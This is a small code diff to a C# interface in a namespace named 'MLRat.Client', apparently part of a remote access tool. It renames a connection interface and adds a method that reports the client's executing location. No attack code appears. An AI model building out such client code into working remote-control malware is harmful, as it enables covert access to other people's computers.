@@ -1,7 +1,8 @@
 ﻿namespace MLRat.Client
 {
-    public interface IClientConnection
+    public interface IClientHost
     {
         void Send(params object[] data);
+        string GetExecutingLocation();
     }
 }
